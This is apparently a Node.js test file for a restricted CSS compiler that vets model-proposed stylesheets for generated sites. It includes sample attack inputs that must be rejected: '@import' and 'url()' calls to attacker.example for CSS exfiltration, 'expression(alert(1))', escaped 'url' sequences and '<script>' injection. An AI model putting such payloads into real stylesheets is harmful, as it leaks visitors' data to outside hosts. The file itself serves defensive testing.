import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {compileRestrictedCss,compileAuthoredSite} from './w5c_restricted_css_compiler.mjs';
import {buildCssCodePrompt,parseCodeProposal,evaluateCodeHeldout} from './w5c_local_code_trial.mjs';
import {EXAMPLE_CODES,fakeCssSourceProvider} from './w5c_test_doubles.mjs';
import {MODEL,syntheticDesign} from './w5b_simulated_provider.mjs';
const batch=JSON.parse(await readFile(new URL('./w5b_heldout_briefs.json',import.meta.url)));
const css=await readFile(new URL('./w5a_base.css',import.meta.url),'utf8');
const [a,b,c]=batch.briefs;

test('three different human TEST DOUBLE source strings compile into canonical safe CSS',()=>{
  const hashes=new Set();
  EXAMPLE_CODES.forEach((source,i)=>{
    const parsed=compileRestrictedCss(source);
    assert(parsed.ruleCount>=3);
    assert(parsed.ruleCount<=8);
    assert(parsed.acceptedSelectors.length>=3);
    assert(!parsed.css.includes('@import'));
    assert(!parsed.css.includes('url('));
    const result=compileAuthoredSite(batch.briefs[i],
      syntheticDesign(batch.briefs[i],i),source,css);
    assert(result.files.get('assets/site.css').includes(parsed.css));
    assert(result.files.get('index.html').includes('script-src &#39;none&#39;'));
    assert(result.files.get('approach/index.html').includes('noindex,nofollow'));
    assert.equal(result.evidence.compiledScriptCount,0);
    assert.equal(result.evidence.modelSourceLanguage,'RESTRICTED_CSS_ONLY');
    assert.equal(result.evidence.realModelInferenceVerified,false);
    assert.equal(result.evidence.releaseGo,false);
    hashes.add(result.evidence.compiledCssFileSha256);
  });
  assert.equal(hashes.size,3);
});
test('reject disallowed CSS exfiltration, imported scripts, escapes and at-rules',()=>{
 const attacks=[
  '@import "https://attacker.example/css";',
  ' .hero h1 { background-image: url(https://attacker.example/pixel); }',
  '.hero h1 { max-width: 20ch; } @media (min-width: 900px) { .section { display: none; } }',
  '.hero h1 { letter-spacing: 0.04em; } /* attacker */',
  '.hero h1 { color: expression(alert(1)); }',
  '.hero h1 { color: red; }',
  '.hero h1 { max-width: 30ch; } .hero h1 { max-width: 40ch; }',
  '.hero h1 { max-width: 30ch; } .section__text { text-align: left; } #admin { display: none; }',
  '.hero h1 { max-width: 30ch; } .hero__figure { transform: translateX(9999px); }',
  '.hero h1 { max-width: 30ch!important; }',
  '.hero h1 { max-width: 30ch; } .hero__figure { border: 1px solid var(--ink); } .section h2 { position: fixed; }',
  '.hero h1 { max-width: 30ch; } .hero__figure { background-color: #000; } .section h2 { font-style: italic; }',
  '.hero h1 { max-width: 30ch; } .hero__figure { background-color: var(--accent); } .section h2 { font-style: italic; }',
  '.hero h1 { max-width: 30ch; } .hero__figure { background-color: var(--surface); } .section h2 { font-style: italic; } \\75rl',
  '.hero h1 { max-width: 30ch; } .hero__figure { background-color: var(--surface); } .section h2 { font-style: italic; } <script>'
 ];
 for(const evil of attacks){
   assert.throws(()=>compileRestrictedCss(EXAMPLE_CODES[0]+'\n'+evil),/^Error: E6_W5C_/);
 }
});
test('reject duplicate rule, sparse/minimal code, excessive code and wrong source type',()=>{
  for(const x of [null,{},'', 'h1{color:red}',EXAMPLE_CODES[0].repeat(30),
    EXAMPLE_CODES[0]+'\n.hero h1 { font-style: italic; }']){
    assert.throws(()=>compileRestrictedCss(x),/E6_W5C_/);
  }
  const tooFew='.hero h1 { max-width: 40ch; } .section__text { max-width: 42ch; }';
  assert.throws(()=>compileRestrictedCss(tooFew),/E6_W5C_TOO_FEW_RULES/);
});
test('reject malformed model code envelope and mismatched brief slug',()=>{
  const valid={version:1,projectSlug:a.projectSlug,cssSource:EXAMPLE_CODES[0]};
  assert.equal(parseCodeProposal(valid,a.projectSlug),EXAMPLE_CODES[0]);
  for(const change of [
    x=>{x.version=2;},x=>{x.projectSlug=b.projectSlug;},
    x=>{x.import='fs';},x=>{delete x.cssSource;},x=>{x.cssSource=[];}
  ]){
    const x=structuredClone(valid);change(x);
    assert.throws(()=>parseCodeProposal(x,a.projectSlug),/E6_W5C_INVALID_MODEL_CODE_ENVELOPE/);
  }
  assert(buildCssCodePrompt(a,syntheticDesign(a,0)).includes('NO @import'));
});
test('the full three-brief two-pass model adapter is tested by fake transport ONLY',async()=>{
  const result=await evaluateCodeHeldout({batch,model:MODEL,baseCss:css,
    transport:fakeCssSourceProvider({briefs:batch.briefs})});
  assert.equal(result.sites.size,3);
  assert.equal(result.report.accepted,3);
  assert.equal(result.report.rejected,0);
  assert.equal(result.report.providerWasActualLoopbackRequest,false);
  assert.equal(result.report.modelRuntimeAttested,false);
  assert.equal(result.report.modelGeneratedJavaScript,false);
  assert.equal(result.report.modelAuthoredRestrictedCssCandidate,true);
  assert.equal(result.report.stage45Go,false);
});
test('provider CSS injection is rejected and fails closed without a site',async()=>{
  const result=await evaluateCodeHeldout({batch,model:MODEL,baseCss:css,
    transport:fakeCssSourceProvider({briefs:batch.briefs,badIndex:1})});
  assert.equal(result.report.accepted,2);
  assert.equal(result.report.rejected,1);
  assert.equal(result.sites.has(b.projectSlug),false);
  assert.equal(result.report.cases[1].status,'REJECTED');
  assert.match(result.report.cases[1].rejectionCode,/^E6_W5C_/);
  assert.equal(result.report.releaseGo,false);
});
test('no external runtime model URL or overbroad code authoring allowed',async()=>{
  await assert.rejects(
    evaluateCodeHeldout({batch,model:'https://evil.example',baseCss:css,
      transport:fakeCssSourceProvider({briefs:batch.briefs})}),
    /E6_W5C_INVALID_REQUEST/);
  assert.throws(()=>compileAuthoredSite(c,syntheticDesign(c,2),
    '.hero h1 { max-width: 30ch; } .hero__figure { background-color: var(--surface); } .section h2 { font-style: italic; } .section h2 { animation: spin 1s; }',
    css),/E6_W5C_/);
});
